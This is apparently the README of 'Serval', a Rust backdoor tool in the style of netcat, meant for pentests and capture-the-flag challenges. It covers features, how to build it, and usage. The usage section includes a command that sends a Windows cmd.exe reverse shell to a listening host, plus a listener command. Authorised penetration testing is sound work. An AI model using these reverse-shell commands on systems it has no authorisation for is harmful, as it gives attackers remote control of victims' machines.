## A Netcat style backdoor for pentesting and pentest challenges

Serval is a lightweight, easy-to-use, binary for spawning reverse and bind shells for pentests or pentesting exercises. Serval is cross platform and can be compiled for both Windows 32 & 64-bit and Linux 32 and 64-bit. Note: Due to the flexibility of Rust
it may be possible to compile for other platforms (such as ARM) but I have not tested for other platforms. 

### Why? 
I developed Serval to remove my dependecy on netcat during HacktheBox challenges since it can be bothersome to find netcat binaries for Windows (especially with the -e option) and it is even more difficult to find a binary from a trusted source.

### Features
* Cross-compileable! Can be built for Linux or Windows
* Command line history. Up and Down arrows will scroll through command history.
* Command line history search! ctrl-r to reverse search your command history.
* Line editing. Backspace and left-right arrow keys work!
* Interoperability. Only have netcat on your target? No problem! The serval listener can still catch the shell and give you the advanced features.

### Installation

#### Rust Users (Compile from source)

Download the source from github
> git clone https://github.com/tgadola/serval.git && cd serval-master

*Optional: Edit the build file at .cargo/config to rewrite your buildpath.

Build the binary for your current platform. 
> cargo build --release

*Note: v1.1.0 requires Rust nightly 

You can build for other platforms using 
> cargo build --release --target \<target-triple>

#### Other
If you're a particulary trusting individual you can download the pre-built binaries [here](https://github.com/tgadola/serval/releases).

### Usage

By default Serval will either listen or connect to a port and pipe standard input and output to that connection. The -e flag will spawn a process and pipe its standard input and output across the network. 

#### Start a listener
Serval listens on all interfaces.

Use the -H flag to activate the line editing and command history features!
> serval -l 4400 -H

#### Spawn a reverse shell 
> serval.exe \<listening ip> \<listening port> -q -e cmd.exe

#### ????

#### Profit

### Special Thanks
A big thank you to @kkawakam-transferwise and their Rustyline crate, which does literally all of the heavy lifting. Check out [Rustyline](https://github.com/kkawakam/rustyline)!

Thank you to the creators and contributors of Clap! Check out [Clap](https://github.com/clap-rs/clap).

Thank you to the creators and contributors of Anyhow! Check out [Anyhow](https://github.com/dtolnay/anyhow). +1 for the great crate name.

Thanks to @jaynus for all of his Rust advice

### License

Apache 2.0. See the License file for more info.
